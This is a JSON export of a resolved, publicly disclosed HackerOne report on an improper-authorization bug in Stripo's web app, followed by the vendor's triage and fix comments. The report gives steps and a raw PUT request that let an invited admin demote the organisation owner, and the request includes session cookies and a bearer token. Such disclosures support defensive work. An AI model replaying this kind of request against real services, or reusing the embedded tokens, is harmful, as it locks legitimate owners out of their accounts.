{"id":751299,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTEyOTk=","url":"https://hackerone.com/reports/751299","title":"Improper Authorization","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-12-04T10:15:52.212Z","submitted_at":"2019-12-04T10:15:52.212Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"abdellah29","url":"/abdellah29","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fUSeo7Z81bz8FzCozCjuQ3Qe/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":42368,"url":"https://hackerone.com/stripo","handle":"stripo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Stripo Inc","twitter_handle":"","website":"https://stripo.email","about":"Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-02-03T13:33:07.442Z","bug_reporter_agreed_on_going_public_at":"2020-01-31T10:04:24.770Z","team_member_agreed_on_going_public_at":"2020-02-03T13:33:07.297Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"hi there ,\n\ni found an vulnerability on  https://my.stripo.email/cabinet/#/users/orog_id ,\n\ngenerally every user have an organisation and the organisation contain projects , \n\nlets suppose : test@gmail.com is the owner of the project\n\nand test2@gmail.com was invited to his project as admin , in normal situation the owner can not be removed even if second account is admin\n\nthe issue is i can removed the owned from hi position to admin , and the big problem once the owner is removed he can not login again to his account\n\n\n## Steps To Reproduce:\n[add details for how we can reproduce the issue]\n\n  1. you must have 2 account , one owner , the second got invited as admin\n\n  2. log in with your second account and go to https://my.stripo.email/cabinet/#/users/xxxx\n\n       you will see that the input of role is disabled , enable it via inspect element ( f12) , \n\nthen change the role of owner for it to admin , an PUT request will be sent\n\n##http request\n\nPUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1\nHost: my.stripo.email\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nAuthorization: Bearer null\nContent-Type: application/json;charset=UTF-8\nCache-Control: no-cache\nPragma: no-cache\nExpires: Sat, 01 Jan 2000 00:00:00 GMT\nContent-Length: 231\nOrigin: https://my.stripo.email\nConnection: close\nReferer: https://my.stripo.email/cabinet/\nCookie: __stripe_mid=f1a62f3d-2ba4-4742-a1ae-97c309223fec; __stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a; _ga=GA1.2.472610903.1575449565; _gid=GA1.2.1705021668.1575449565; _fbp=fb.1.1575449579810.16963820; token=eyJhbGciOiJIUzI1NiJ9.eyJzZWN1cml0eUNvbnRleHQiOiJ7XCJ1c2VySW5mb1wiOntcImlkXCI6MTMwODUxLFwiZW1haWxcIjpcImFiZGVsbGFobmFkaTNAZ21haWwuY29tXCIsXCJsb2NhbGVLZXlcIjpcImVuXCIsXCJmaXJzdE5hbWVcIjpcInRlc3Q0NVwiLFwibGFzdE5hbWVcIjpcIm5cIixcImdhSWRcIjpcImJiYzBkNGExLWI5NDYtNDIwMy1iOTNmLTcxNjhmYmEyMWI5ZVwiLFwicGhvbmVzXCI6W10sXCJhY3RpdmVcIjpmYWxzZSxcImFjdGl2ZVByb2plY3RJZFwiOjEzNzg3NyxcImlzU3VwZXJVc2VyXCI6ZmFsc2UsXCJzdXBlclVzZXJWMlwiOmZhbHNlLFwib25seUZiQ3JlZGVudGlhbHNcIjpmYWxzZSxcInNldHRpbmdzRW1haWxTb3J0QnlcIjpcImNyZWF0ZWRUaW1lXCIsXCJzZXR0aW5nc0VtYWlsU29ydEFzY1wiOmZhbHNlLFwic2V0dGluZ3NUZW1wbGF0ZVNvcnRCeVwiOlwidXBkYXRlZFRpbWVcIixcInNldHRpbmdzVGVtcGxhdGVTb3J0QXNjXCI6ZmFsc2UsXCJjb2xvclwiOlwiI2ZiYTc2ZlwiLFwib3JnYW5pemF0aW9uSWRcIjoxMzA2NjUsXCJzdWJzY3JpcHRpb25UeXBlXCI6XCJGUkVFXCIsXCJjb25zZW50UmVjZWl2ZWRcIjp0cnVlLFwidGVtcGxhdGVDcmVhdGVkT25Mb2dpblwiOmZhbHNlLFwiZmlyc3RMb2dpblwiOmZhbHNlfSxcImlzc3VlZEF0XCI6MTU3NTQ1MDIzMDMxOH0ifQ.GidxPLc4Wu80JWxScUjLrq4nmLr2lEamONcWsATBQfY; intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4\n\n{\"repository\":{},\"idField\":\"id\",\"entityType\":\"USER\",\"id\":135628,\"role\":\"admin\",\"organizationId\":135428,\"firstName\":\"TESt\",\"lastName\":\"account\",\"color\":\"#cc90e2\",\"email\":\"pain45@wearehackerone.com\",\"projectIds\":[],\"suspended\":false} \n\n##http response :\n\n\nHTTP/1.1 200 \nServer: nginx\nDate: Wed, 04 Dec 2019 09:56:41 GMT\nContent-Type: application/json;charset=UTF-8\nConnection: close\nVary: Accept-Encoding\n█████████\n████\nX-Frame-Options: sameorigin\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Length: 180\n\n█████cc90e2\",\"email\":\"pain45@wearehackerone.com\",\"projectIds\":[],\"suspended\":false}\n\ni hope it is clear , \n\nthanks\n\n## Impact\n\nan attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account","weakness":{"id":124,"name":"Improper Authorization"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":16,"voters":["realtess","brumens","prob0x01","khizer47","exception","cryptographer","sammartin","b9372d4605459ca97219795","wedtm","defectstar","and 6 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":38702,"asset_type":"URL","asset_identifier":"my.stripo.email","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6466833,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @pain45 \nThanks a lot for this report and for your contribution to improving the security of our app.\nI've created a task for our developers to fix this issue asap.\nI will keep you updated on this issue.","automated_response":false,"created_at":"2019-12-04T15:17:34.592Z","updated_at":"2019-12-04T15:17:34.592Z","actor":{"username":"artem_nefedov","cleared":false,"url":"/artem_nefedov","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6623391,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi there artem  , any update about this issue ?\n\nregard ,\n\nnadi\n\n","automated_response":false,"created_at":"2019-12-24T18:39:54.889Z","updated_at":"2019-12-24T18:39:54.889Z","actor":{"username":"abdellah29","cleared":false,"url":"/abdellah29","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fUSeo7Z81bz8FzCozCjuQ3Qe/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6718639,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @pain45 \n\nThanks for checking.\n\nThis is already solved and is in the queue to be released soon. We expect to close this report as solved one before the 15th of January.","automated_response":false,"created_at":"2020-01-08T15:28:22.084Z","updated_at":"2020-01-08T15:28:22.084Z","actor":{"username":"artem_nefedov","cleared":false,"url":"/artem_nefedov","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6855981,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-01-24T04:42:24.611Z","updated_at":"2020-01-24T04:42:24.611Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":616524},"actor":{"username":"abdellah29","cleared":false,"url":"/abdellah29","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fUSeo7Z81bz8FzCozCjuQ3Qe/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6864528,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @artem_nefedov  any update ?\n","automated_response":false,"created_at":"2020-01-24T19:10:16.903Z","updated_at":"2020-01-24T19:10:16.903Z","actor":{"username":"abdellah29","cleared":false,"url":"/abdellah29","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fUSeo7Z81bz8FzCozCjuQ3Qe/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6881513,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pain45 the release has delayed, planning at the end of this week.","automated_response":false,"created_at":"2020-01-27T16:05:23.442Z","updated_at":"2020-01-27T16:05:23.442Z","actor":{"username":"artem_nefedov","cleared":false,"url":"/artem_nefedov","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6926345,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@pain45 \n\nThe issue has been fixed, thanks a lot for your contribution! We are happy to get more reports from you.","automated_response":false,"created_at":"2020-01-31T07:13:03.619Z","updated_at":"2020-01-31T07:13:03.619Z","actor":{"username":"artem_nefedov","cleared":false,"url":"/artem_nefedov","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"abdellah29","url":"/abdellah29"},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6926511,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @artem_nefedov thanks for the response , i'll try to find more vulnerabilities and send you more report in the next few days\n\nkind regard,\n\nNadi","automated_response":false,"created_at":"2020-01-31T08:03:57.968Z","updated_at":"2020-01-31T08:03:57.968Z","actor":{"username":"abdellah29","cleared":false,"url":"/abdellah29","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fUSeo7Z81bz8FzCozCjuQ3Qe/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6929051,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"@artem_nefedov  can we disclosure this ?\n","automated_response":false,"created_at":"2020-01-31T10:04:24.792Z","updated_at":"2020-01-31T10:04:24.792Z","first_to_agree":true,"actor":{"username":"abdellah29","cleared":false,"url":"/abdellah29","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fUSeo7Z81bz8FzCozCjuQ3Qe/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6950305,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-02-03T13:33:07.340Z","updated_at":"2020-02-03T13:33:07.340Z","actor":{"username":"artem_nefedov","cleared":false,"url":"/artem_nefedov","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6950306,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-02-03T13:33:07.464Z","updated_at":"2020-02-03T13:33:07.464Z","actor":{"username":"artem_nefedov","cleared":false,"url":"/artem_nefedov","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"stripo","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}